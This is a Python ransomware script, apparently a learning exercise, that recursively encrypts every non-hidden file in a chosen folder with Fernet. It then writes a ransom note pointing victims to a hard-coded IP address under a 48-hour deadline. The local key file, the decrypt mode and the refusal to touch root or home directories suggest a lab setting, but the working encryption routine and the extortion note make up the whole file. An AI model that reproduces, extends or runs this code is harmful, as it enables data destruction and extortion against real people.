import os
import sys
from cryptography.fernet import Fernet

# File to store the encryption key
KEY_FILE = os.path.abspath("encryption.key")


# Generate a new encryption key and save it (WE USE THIS KEY FOR BOTH ENCRYPTION AND DECRYPTION)
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)

# Load the existing key, or generate one if it doesn't exist
def load_key():
    if not os.path.exists(KEY_FILE):
        generate_key()
    with open(KEY_FILE, "rb") as key_file:
        return key_file.read()

# Encrypt a single file (uses the fernet object to encrypt the data)
def encrypt_file(file_path, fernet):
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted_data = fernet.encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Decrypt a single file
def decrypt_file(file_path, fernet):
    with open(file_path, "rb") as file:
        data = file.read()
    decrypted_data = fernet.decrypt(data)
    with open(file_path, "wb") as file:
        file.write(decrypted_data)

# Encrypt or decrypt all files in a folder
def process_folder(folder_path, mode):
    key = load_key()
    fernet = Fernet(key)

    #os.walk returns a tuple so we can loop through all files in the folder
    for root, _, files in os.walk(folder_path):
        for file in files:
            #Joins them together to craete a path
            file_path = os.path.join(root, file)

            # Skip hidden files and the key file itself
            if file.startswith(".") or os.path.abspath(file_path) == KEY_FILE:
                continue

            try:
                if mode == "encrypt":
                    encrypt_file(file_path, fernet)
                    print(f"[+] Encrypted: {file_path}")
                elif mode == "decrypt":
                    decrypt_file(file_path, fernet)
                    print(f"[+] Decrypted: {file_path}")
            except Exception as e:
                print(f"[!] Error processing {file_path}: {e}")

    # After encrypting, create a ransom note
    if mode == "encrypt":
        #Path to store the ransom note in (will be stored in whatever the folder the user inputted)
        ransom_note_path = os.path.abspath(os.path.join(folder_path, "RANSOM_NOTE.txt"))
        with open(ransom_note_path, "w") as note:
            note.write(
                "!!! Your files have been encrypted !!!\n\n"
                "To recover your data:\n"
                "1. Visit: http://52.201.223.230/\n"
                "2. Enter your email address to receive further instructions\n"
                "Do NOT try to rename or decrypt the files manually.\n"
                "You have 48 hours or your data will be lost forever.\n"
            )
        print(f"[+] Ransom note written to: {ransom_note_path}")




# Main (USE CLI/TERMINAL)
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 folder_encryption.py [encrypt|decrypt] <folder_path>")
        sys.exit(1)

    action = sys.argv[1]
    folder_path = sys.argv[2]

    # Prevent encrypting critical system or home directories
    risky_paths = ["/", os.path.expanduser("~"), "C:\\", "C:\\Users"]
    if os.path.abspath(folder_path) in [os.path.abspath(p) for p in risky_paths]:
        print("Error: These directories are dangerous... DON'T XD")
        sys.exit(1)


    # Validate folder path
    if not os.path.isdir(folder_path):
        print("Error: Path is not a valid folder.")
        sys.exit(1)

    # Process based on action
    if action in ("encrypt", "decrypt"):
        process_folder(folder_path, action)
    else:
        print("Invalid action: 'encrypt' or 'decrypt'.")
